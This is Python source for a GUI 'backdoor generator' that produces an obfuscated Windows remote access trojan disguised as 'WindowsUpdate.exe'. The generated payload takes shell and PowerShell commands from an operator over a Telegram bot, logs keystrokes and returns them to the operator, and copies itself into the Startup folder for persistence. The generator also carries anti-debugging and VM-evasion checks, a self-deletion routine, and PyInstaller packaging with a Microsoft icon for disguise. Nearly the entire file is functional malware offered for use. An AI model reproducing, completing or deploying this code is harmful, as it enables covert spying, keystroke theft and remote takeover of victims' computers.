import sys
import os
import logging
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QComboBox, QCheckBox, QLineEdit, QPushButton, QTextEdit,
                             QLabel, QFrame, QHBoxLayout, QGridLayout)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QPixmap
import asyncio
import shlex
from pynput import keyboard
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram import Update
import datetime
import traceback
import subprocess
import tempfile
import shutil
import re
import threading
import queue
import time
import base64
import ctypes
import random
import string
import zlib

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Set to DEBUG to capture all log levels
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('backdoor_generation.log', encoding='utf-8'),  # Log to file
        logging.StreamHandler()  # Log to console
    ]
)

# Create a logger for the PayloadGenerator
payload_logger = logging.getLogger('PayloadGenerator')
payload_logger.setLevel(logging.DEBUG)

# Create necessary directories
os.makedirs("output", exist_ok=True)

class AntiDetection:
    @staticmethod
    def is_debugger_present():
        """Check if debugger is attached"""
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False

    @staticmethod
    def is_virtual_environment():
        """Detect common virtual machine and sandbox indicators"""
        vm_indicators = [
         '/proc/vmware',
            '/proc/vbox',
            'VIRTUAL',
            'VMWARE',
            'VIRTUALBOX',
            'QEMU',
            'HYPERV'
        ]
        
        try:
            # Check environment variables
            for key, value in os.environ.items():
                if any(indicator in key.upper() or indicator in str(value).upper() for indicator in vm_indicators):
                    return True
            
            # Check system information
            system_info = subprocess.check_output('systeminfo', shell=True).decode('utf-8', errors='ignore')
            return any(indicator in system_info.upper() for indicator in vm_indicators)
        except:
            return False

    @staticmethod
    def obfuscate_payload(payload):
        """Advanced payload obfuscation that maintains Python syntax"""
        import base64
        import zlib
        import random
        import string
        import hashlib

        # Generate a consistent random seed based on payload content
        def generate_consistent_name(payload):
            # Use hash to create a consistent random seed
            hash_obj = hashlib.md5(payload.encode())
            random.seed(hash_obj.hexdigest())
            return f"_decrypt_{random.randint(1000, 9999)}"

        # Generate consistent function name
        decrypt_func_name = generate_consistent_name(payload)

        # Compress and encode the payload
        compressed = zlib.compress(payload.encode())
        encoded = base64.b64encode(compressed).decode()

        # Create a polymorphic decryption function
        obfuscated = f"def {decrypt_func_name}(payload):\n"
        obfuscated += "    import base64\n"
        obfuscated += "    import zlib\n"
        obfuscated += "    try:\n"
        obfuscated += "        decoded = base64.b64decode(payload)\n"
        obfuscated += "        decompressed = zlib.decompress(decoded)\n"
        obfuscated += "        return decompressed.decode()\n"
        obfuscated += "    except Exception:\n"
        obfuscated += "        return None\n\n"

        # Generate the obfuscated payload
        obfuscated += f"_payload = '{encoded}'\n"
        obfuscated += f"exec({decrypt_func_name}(_payload))"

        return obfuscated

    @staticmethod
    def deobfuscate_payload(obfuscated_payload):
        """Deobfuscate the payload"""
        try:
            # Extract the base64 encoded payload
            import re
            match = re.search(r"_payload = '(.*)'", obfuscated_payload)
            if match:
                encoded = match.group(1)
                decoded = base64.b64decode(encoded)
                decompressed = zlib.decompress(decoded)
                return decompressed.decode()
            return None
        except:
            return None

class SelfDestruct:
    @staticmethod
    def delete_self():
        """Attempt to delete the executable after running"""
        try:
            script_path = sys.argv[0]
            threading.Thread(target=SelfDestruct._delete_file, args=(script_path,), daemon=True).start()
        except:
            pass

    @staticmethod
    def _delete_file(file_path):
        """Background thread to delete file"""
        try:
            time.sleep(10)  # Wait before deletion
            os.remove(file_path)
        except:
            pass

class StealthTelegram:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id

    def initialize(self):
        """Initialize with anti-detection checks"""
        # Run only if not in debugger or VM
        if not AntiDetection.is_debugger_present() and not AntiDetection.is_virtual_environment():
            self._start_bot()
        else:
            sys.exit(0)

    def _start_bot(self):
        """Start Telegram bot with additional stealth"""
        try:
            import telegram
            from telegram.ext import Updater, CommandHandler

            def safe_command_handler(update, context):
                """Secure command handling with admin check"""
                if str(update.effective_user.id) != self.admin_id:
                    return

                # Rest of the command logic here
                pass

            # Configure bot with enhanced security
            updater = Updater(token=self.token, use_context=True)
            dispatcher = updater.dispatcher

            # Add command handlers
            dispatcher.add_handler(CommandHandler("start", safe_command_handler))
            
            # Start bot in background
            updater.start_polling()
            updater.idle()

        except Exception:
            # Silent failure
            pass

class PayloadGenerator:
    def __init__(self):
        """Initialize PayloadGenerator with logging"""
        self.logger = payload_logger
        self.logger.debug("PayloadGenerator initialized")  # Add debug log

    def generate_payload(self, options):
        """Generate the payload code with the specified options"""
        try:
            # Log input options for debugging
            self.logger.info(f"Generating payload with options: {options}")

            # Validate input options
            token = options.get('telegram_token', '').strip()
            admin_id = options.get('telegram_admin_id', '').strip()
            
            # Get persistence and keylogger options
            persistence = options.get('persistence', False)
            keylogger = options.get('keylogger', False)

            # Validate input options
            if not token:
                self.logger.error("Telegram bot token is missing")
                return None
            
            if not admin_id:
                self.logger.error("Telegram admin ID is missing")
                return None
            
            if not admin_id.isdigit():
                self.logger.error("Telegram admin ID must be a numeric value")
                return None

            # Validate token format (basic check)
            import re
            if not re.match(r'^[0-9]{9,10}:[A-Za-z0-9_-]{35}$', token):
                self.logger.error("Invalid Telegram bot token format")
                return None

            # Generate payload with comprehensive error handling
            try:
                payload_template = '''import os
import sys
import logging
import shlex
import asyncio
import threading
from datetime import datetime
from typing import Optional
from pynput import keyboard
from telegram.ext import Application, CommandHandler, ContextTypes

# Configure logging to suppress output
logging.basicConfig(
    level=logging.CRITICAL,  # Suppress all logs except critical errors
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("intel.log"),
    ]
)

# Global variable to track the current directory
current_directory = os.getcwd()

# Persistence function
def establish_persistence() -> bool:
    """Establish persistence by copying to startup folder."""
    try:
        startup_path = os.path.join(
            os.environ.get("APPDATA", ""), 
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        if not os.path.exists(startup_path):
            return False

        current_exe = sys.executable
        startup_exe = os.path.join(startup_path, "WindowsUpdate.exe")

        if not os.path.exists(startup_exe):
            import shutil
            shutil.copy2(current_exe, startup_exe)
        return True
    except Exception as e:
        logging.exception("Failed to establish persistence: %s", e)
        return False

# Keylogger function
def start_keylogger():
    """Start the keylogger functionality."""
    temp_dir = os.getenv("TEMP", os.path.expanduser("~"))
    log_file = os.path.join(temp_dir, "keylog.txt")

    def on_press(key):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {key.char if hasattr(key, 'char') else str(key)}\\n")
        except Exception as e:
            logging.exception("Keylogger error: %s", e)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Telegram handler class
class TelegramHandler:
    def __init__(self, token: str, admin_id: str):
        self.token = token
        self.admin_id = admin_id

    async def start_command(self, update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command."""
        if str(update.effective_user.id) != self.admin_id:
            return
        await update.message.reply_text(
            "🔒 Backdoor Control Panel\\n"
            "Commands:\\n"
            "/query <command> - Execute shell command\\n"
            "/keylog - Get keylogger data\\n"
            "/sysinfo - Get system information\\n"
            "/query whoami - Show current user\\n"
            "/query tasklist - List running processes\\n"
            "/query ipconfig - Show network configuration\\n"
            "/query getmac - Retrieve the MAC address of network interfaces."
        )

    async def execute_shell_command(self, command: str) -> str:
        """Safely execute shell command."""
        global current_directory
        try:
            if not command.strip():
                return "[-] Empty command"

            # Handle directory change commands like 'cd'
            if command.lower().startswith("cd"):
                parts = command.split(maxsplit=1)
                if len(parts) > 1:
                    target_dir = parts[1].strip()
                    if target_dir == "..":
                        current_directory = os.path.dirname(current_directory)
                    else:
                        new_dir = os.path.join(current_directory, target_dir)
                        if os.path.isdir(new_dir):
                            current_directory = new_dir
                        else:
                            return f"[-] Directory not found: {target_dir}"
                return f"[+] Current directory: {current_directory}"

            # Execute the tasklist command
            if command.lower() == "tasklist":
                process = await asyncio.create_subprocess_shell(
                    "tasklist",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await process.communicate()

                if stderr:
                    return f"[-] Error:\\n{stderr.decode()}"

                output = stdout.decode().strip().splitlines()

                # Get the first 13 lines (processes)
                first_13_processes = "\\n".join(output[4:16])  # Assuming the first three lines are headers
                return first_13_processes if first_13_processes else "[+] No processes found"

            process = await asyncio.create_subprocess_shell(
                f"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command {shlex.quote(command)}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=current_directory
            )
            stdout, stderr = await process.communicate()

            if stderr:
                return f"[-] Error:\\n{stderr.decode()}"
            output = stdout.decode()

            return output if output else "[+] Command executed (no output)"
        except Exception as e:
            logging.exception("Command execution error: %s", e)
            return "[-] Error occurred"

    async def sysinfo_command(self, update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /sysinfo command."""
        if str(update.effective_user.id) != self.admin_id:
            return

        try:
            process = await asyncio.create_subprocess_shell(
                "systeminfo",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stderr:
                await update.message.reply_text(f"[-] Error:\\n{stderr.decode()}")
                return

            content = stdout.decode()
            await self.send_split_message(update, content)
        except Exception as e:
            logging.exception("Sysinfo command error: %s", e)
            await update.message.reply_text("[-] Error fetching system info")

    async def send_split_message(self, update, message: str):
        """Send long messages in parts."""
        max_length = 4000
        for i in range(0, len(message), max_length):
            await update.message.reply_text(message[i:i + max_length])

    async def keylog_command(self, update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /keylog command."""
        if str(update.effective_user.id) != self.admin_id:
            return

        temp_dir = os.getenv("TEMP", os.path.expanduser("~"))
        log_file = os.path.join(temp_dir, "keylog.txt")

        if not os.path.exists(log_file):
            await update.message.reply_text("[-] No keylog data available")
            return

        try:
            with open(log_file, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if len(content) > 4000:
                    await update.message.reply_document(log_file)
                else:
                    await update.message.reply_text(content)
        except Exception as e:
            logging.exception("Keylog read error: %s", e)
            await update.message.reply_text("[-] Error reading keylog data")

    async def query_command(self, update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /query command."""
        if str(update.effective_user.id) != self.admin_id:
            return
        command = update.message.text[7:].strip()  # Get command after /query
        response = await self.execute_shell_command(command)
        await update.message.reply_text(response)

    async def start_bot(self):
        """Start Telegram bot."""
        try:
            application = Application.builder().token(self.token).build()

            application.add_handler(CommandHandler("start", self.start_command))
            application.add_handler(CommandHandler("query", self.query_command))
            application.add_handler(CommandHandler("keylog", self.keylog_command))
            application.add_handler(CommandHandler("sysinfo", self.sysinfo_command))

            await application.initialize()
            await application.start()
            await application.updater.start_polling()
            await asyncio.Future()  # Keep running
        except Exception as e:
            logging.exception("Error starting bot: %s", e)
        finally:
            await application.shutdown()


# Main execution
def main():
    token = "{TOKEN}"
    admin_id = "{ADMIN_ID}"
    persistence = {PERSISTENCE}
    keylogger = {KEYLOGGER}

    try:
        # Conditional persistence
        if persistence:
            establish_persistence()

        # Conditional keylogger
        if keylogger:
            threading.Thread(target=start_keylogger, daemon=True).start()

        # Start Telegram bot
        handler = TelegramHandler(token, admin_id)
        asyncio.run(handler.start_bot())

    except Exception as e:
        logging.exception("Main execution error: %s", e)

if __name__ == "__main__":
    main()'''

                # Perform the string formatting
                payload = payload_template.replace("{TOKEN}", token) \
                    .replace("{ADMIN_ID}", admin_id) \
                    .replace("{PERSISTENCE}", str(persistence).capitalize()) \
                    .replace("{KEYLOGGER}", str(keylogger).capitalize())

                # Obfuscate the payload
                obfuscated_payload = AntiDetection.obfuscate_payload(payload)

                # Write the payload to a file for reference
                output_dir = os.path.join(os.getcwd(), "output")
                os.makedirs(output_dir, exist_ok=True)
                payload_path = os.path.join(output_dir, "payload.py")
                
                try:
                    with open(payload_path, "w", encoding="utf-8") as f:
                        f.write(obfuscated_payload)
                    self.logger.info(f"Payload saved to {payload_path}")
                except Exception as write_error:
                    self.logger.error(f"Failed to write payload to file: {write_error}")

                self.logger.info("Payload generated successfully")
                return obfuscated_payload
            except Exception as payload_error:
                self.logger.error(f"Error generating payload: {payload_error}")
                self.logger.error(traceback.format_exc())
                return None

        except Exception as e:
            self.logger.error(f"Comprehensive payload generation error: {e}")
            self.logger.error(traceback.format_exc())
            return None

    def _generate_exe_payload(self, options):
        """Generate an executable payload using PyInstaller with Windows Update spoofing"""
        import threading
        import subprocess
        import tempfile
        import shutil
        import sys
        import os
        import queue
        import time

        try:
            # Validate options
            if not options or not all(key in options for key in ['telegram_token', 'telegram_admin_id']):
                self.logger.error("Missing required options for payload generation")
                return None

            # Generate payload code
            payload = self.generate_payload(options)
            if not payload:
                self.logger.error("Failed to generate payload code")
                return None

            # Create output directory if it doesn't exist
            output_dir = os.path.join(os.getcwd(), "output")
            os.makedirs(output_dir, exist_ok=True)

            # Generate unique filename
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            temp_dir = tempfile.mkdtemp()
            
            # Temporary Python script path
            temp_py_path = os.path.join(temp_dir, f"backdoor_{timestamp}.py")
            
            # Write payload to temporary file
            try:
                with open(temp_py_path, "w", encoding="utf-8") as f:
                    f.write(payload)
            except IOError as write_error:
                self.logger.error(f"Error writing payload to file: {write_error}")
                return None

            # Thread-safe result queue
            result_queue = queue.Queue()

            # PyInstaller generation thread
            def generate_exe_thread():
                try:
                    # Prepare PyInstaller command
                    pyinstaller_args = [
                        "pyinstaller",
                        "--onefile",           # Single executable
                        "--windowed",          # No console window
                        "--clean",             # Clean PyInstaller cache
                        "--log-level=WARN",    # Reduce log verbosity
                        f"--name=WindowsUpdate",  # Output name as WindowsUpdate
                        f"--distpath={output_dir}",     # Output directory
                        "--hidden-import=pynput.keyboard._win32",
                        "--hidden-import=pynput.mouse._win32",
                        "--hidden-import=telegram",
                        "--hidden-import=telegram.ext",
                        "--add-data", f"{sys.executable};.",  # Include Python interpreter
                        "--add-binary", f"{os.path.dirname(sys.executable)}\\python*.dll;.",  # Include Python DLLs
                        
                        # Add version info
                        f"--version-file={os.path.join(os.getcwd(), 'windows_update.txt')}",
                        
                        # Add Microsoft icon (ensure the icon exists)
                        f"--icon={os.path.join(os.getcwd(), 'microsoft.ico')}",
                        
                        temp_py_path
                    ]

                    # Run PyInstaller
                    result = subprocess.run(
                        pyinstaller_args, 
                        capture_output=True, 
                        text=True, 
                        timeout=600  # 10-minute timeout
                    )
                    
                    # Check if PyInstaller was successful
                    if result.returncode != 0:
                        error_msg = f"PyInstaller error: {result.stderr}"
                        self.logger.error(error_msg)
                        result_queue.put((None, error_msg))
                        return

                    # Find the generated executable
                    exe_candidates = [
                        os.path.join(output_dir, file) 
                        for file in os.listdir(output_dir) 
                        if file.endswith('.exe') and 'WindowsUpdate' in file
                    ]

                    if exe_candidates:
                        exe_path = exe_candidates[0]
                        
                        # Rename to WindowsUpdate.exe
                        final_exe_path = os.path.join(output_dir, "WindowsUpdate.exe")
                        os.rename(exe_path, final_exe_path)
                        
                        # Add executable permissions
                        try:
                            os.chmod(final_exe_path, 0o755)
                        except Exception as perm_error:
                            self.logger.warning(f"Could not set executable permissions: {perm_error}")
                        
                        result_queue.put((final_exe_path, None))
                    else:
                        result_queue.put((None, "No executable found after PyInstaller"))

                except subprocess.TimeoutExpired:
                    result_queue.put((None, "PyInstaller process timed out"))
                except Exception as exe_error:
                    result_queue.put((None, f"PyInstaller execution error: {exe_error}"))

            # Start the thread
            exe_thread = threading.Thread(target=generate_exe_thread, daemon=True)
            exe_thread.start()

            # Wait for the thread to complete with a timeout
            exe_thread.join(timeout=660)  # 11-minute timeout

            # Get the result from the queue
            try:
                exe_path, error = result_queue.get(timeout=5)
            except queue.Empty:
                error = "Executable generation timed out"
                exe_path = None

            # Clean up temporary directory
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except Exception:
                pass

            # Handle the result
            if error:
                self.logger.error(error)
                return None

            if exe_path:
                self.logger.info(f"Executable generated: {exe_path}")
                return exe_path

            self.logger.error("Failed to generate executable")
            return None

        except Exception as generation_error:
            self.logger.error(f"Comprehensive EXE generation error: {generation_error}")
            return None

    def _generate_python_payload(self, options):
        """Generate a Python script payload with non-blocking thread"""
        import threading
        import queue
        import os
        import datetime

        # Thread-safe result queue
        result_queue = queue.Queue()

        def payload_generation_thread():
            """Thread function to generate payload"""
            try:
                # Validate options
                if not options or not all(key in options for key in ['telegram_token', 'telegram_admin_id']):
                    result_queue.put((None, "Missing required options for payload generation"))
                    return

                # Generate payload code
                payload = self.generate_payload(options)
                if not payload:
                    result_queue.put((None, "Failed to generate payload code"))
                    return

                # Create output directory if it doesn't exist
                output_dir = os.path.join(os.getcwd(), "output")
                os.makedirs(output_dir, exist_ok=True)

                # Generate unique filename using current time
                current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                output_path = os.path.join(output_dir, f"backdoor_{current_time}.py")

                # Write payload to file
                try:
                    with open(output_path, "w", encoding="utf-8") as f:
                        f.write(payload)
                except IOError as write_error:
                    result_queue.put((None, f"Error writing payload to file: {write_error}"))
                    return

                # Log successful generation
                self.logger.info(f"Payload generated successfully: {output_path}")
                result_queue.put((output_path, None))

            except Exception as e:
                error_msg = f"Comprehensive payload generation error: {e}"
                self.logger.error(error_msg)
                result_queue.put((None, error_msg))

        # Create and start the thread
        payload_thread = threading.Thread(target=payload_generation_thread, daemon=True)
        payload_thread.start()

        # Wait for the thread to complete with a timeout
        payload_thread.join(timeout=60)  # 1-minute timeout

        # Get the result from the queue
        try:
            output_path, error = result_queue.get(timeout=5)
        except queue.Empty:
            error = "Payload generation timed out"
            output_path = None

        # Handle the result
        if error:
            self.logger.error(error)
            return None

        return output_path

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WINBCR-GEN|BY@lfillaz|v1.0")
        self.setFixedSize(800, 600)
        self.setStyleSheet("""
            QMainWindow { background-color: #000000; }
            QLabel { color: #ffffff; font-size: 11px; }
            QComboBox, QLineEdit {
                background-color: #1a1a1a; color: #00ff00; border: 1px solid #00ff00;
                padding: 5px; border-radius: 3px; font-size: 11px;
            }
            QPushButton {
                background-color: #1a1a1a; color: #ff0000; border: 2px solid #ff0000;
                padding: 8px 15px; font-weight: bold; border-radius: 5px; font-size: 12px;
            }
            QPushButton:hover { background-color: #ff0000; color: #ffffff; }
            QCheckBox { color: #00ff00; spacing: 5px; font-size: 11px; }
            QTextEdit {
                background-color: #1a1a1a; color: #00ff00; border: 1px solid #00ff00;
                border-radius: 3px; font-family: 'Courier New'; font-size: 11px;
            }
        """)
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(10)
        layout.setContentsMargins(15, 15, 15, 15)

        # Logo and Title
        top_section = QHBoxLayout()
        logo_label = QLabel()
        logo_label.setPixmap(QPixmap("WindowsUpdate.png").scaled(100, 100, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        logo_label.setFixedSize(100, 100)
        logo_label.setAlignment(Qt.AlignCenter)
        top_section.addWidget(logo_label)

        header = QLabel("WindowsUpdate \nBACKDOOR GENERATOR")
        header.setStyleSheet("color: #00bfa5; font-size: 20px; font-weight: bold; font-family: 'Courier New';")
        header.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        top_section.addWidget(header)
        top_section.addStretch()
        layout.addLayout(top_section)

        # Payload Format
        format_label = QLabel("PAYLOAD FORMAT:")
        format_label.setStyleSheet("color: #ff0000; font-weight: bold;")
        layout.addWidget(format_label)

        self.format_combo = QComboBox()
        self.format_combo.addItems(["Windows Executable (EXE)"])
        layout.addWidget(self.format_combo)

        # Features
        features_label = QLabel("FEATURES:")
        features_label.setStyleSheet("color: #ff0000; font-weight: bold;")
        layout.addWidget(features_label)

        feature_grid = QGridLayout()
        self.persistence_check = QCheckBox("Enable Persistence")
        self.keylogger_check = QCheckBox("Enable Keylogger")
        feature_grid.addWidget(self.persistence_check, 0, 0)
        feature_grid.addWidget(self.keylogger_check, 0, 1)
        layout.addLayout(feature_grid)

        # Telegram Configuration
        telegram_label = QLabel("TELEGRAM CONFIGURATION:")
        telegram_label.setStyleSheet("color: #ff0000; font-weight: bold;")
        layout.addWidget(telegram_label)

        self.bot_token = QLineEdit()
        self.bot_token.setPlaceholderText("Enter Telegram Bot Token")
        layout.addWidget(self.bot_token)

        self.authorized_user = QLineEdit()
        self.authorized_user.setPlaceholderText("Enter Authorized User ID")
        layout.addWidget(self.authorized_user)

        # Generate Button
        self.generate_btn = QPushButton("GENERATE PAYLOAD")
        self.generate_btn.clicked.connect(self.generate_payload)
        layout.addWidget(self.generate_btn)

        # Status Log
        self.status_log = QTextEdit()
        self.status_log.setFixedHeight(150)
        self.status_log.setReadOnly(True)
        self.status_log.setPlaceholderText("Status and generation logs will appear here...")
        layout.addWidget(self.status_log)

    def generate_payload(self):
        """Generate the payload based on selected options"""
        try:
            # Validate Telegram configuration
            token = self.bot_token.text().strip()
            admin_id = self.authorized_user.text().strip()

            # Log initial input
            logging.info(f"Payload generation started. Token length: {len(token)}, Admin ID length: {len(admin_id)}")

            # Validate inputs
            if not token or not admin_id:
                error_msg = "[-] Error: Please enter both Telegram Bot Token and Admin ID"
                self.status_log.append(error_msg)
                logging.error(error_msg)
                return

            # Validate token format
            import re
            if not re.match(r'^[0-9]{9,10}:[A-Za-z0-9_-]{35}$', token):
                error_msg = "[-] Error: Invalid Telegram Bot Token format"
                self.status_log.append(error_msg)
                logging.error(error_msg)
                return

            # Validate admin ID
            if not admin_id.isdigit():
                error_msg = "[-] Error: Admin ID must be a numeric value"
                self.status_log.append(error_msg)
                logging.error(error_msg)
                return

            # Prepare options dictionary
            options = {
                'telegram_token': token,
                'telegram_admin_id': admin_id,
                'persistence': self.persistence_check.isChecked(),
                'keylogger': self.keylogger_check.isChecked()
            }

            # Log options
            logging.info(f"Payload options: {options}")

            # Initialize payload generator
            generator = PayloadGenerator()
            
            # Generate payload based on selected format
            format_type = self.format_combo.currentText()
            logging.info(f"Selected payload format: {format_type}")

            # Determine payload generation method
            if format_type == "Windows Executable (EXE)":
                payload_method = generator._generate_exe_payload
            elif format_type == "Python Script":
                payload_method = generator._generate_python_payload
            else:
                error_msg = f"[-] Unsupported format: {format_type}"
                self.status_log.append(error_msg)
                logging.error(error_msg)
                return

            # Generate payload
            try:
                output_path = payload_method(options)
                logging.info(f"Payload generation method returned: {output_path}")
            except Exception as payload_gen_error:
                error_msg = f"[-] Payload generation error: {str(payload_gen_error)}"
                self.status_log.append(error_msg)
                logging.error(error_msg, exc_info=True)
                return

            # Check payload generation result
            if output_path and os.path.exists(output_path):
                success_msg = f"[+] Backdoor generated successfully in {output_path}"
                self.status_log.append(success_msg)
                logging.info(success_msg)
            else:
                error_msg = "[-] Failed to generate backdoor"
                self.status_log.append(error_msg)
                logging.error(error_msg)

        except Exception as generation_error:
            # Catch-all error handling
            error_msg = f"[-] Unexpected error during payload generation: {str(generation_error)}"
            self.status_log.append(error_msg)
            logging.error(error_msg, exc_info=True)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
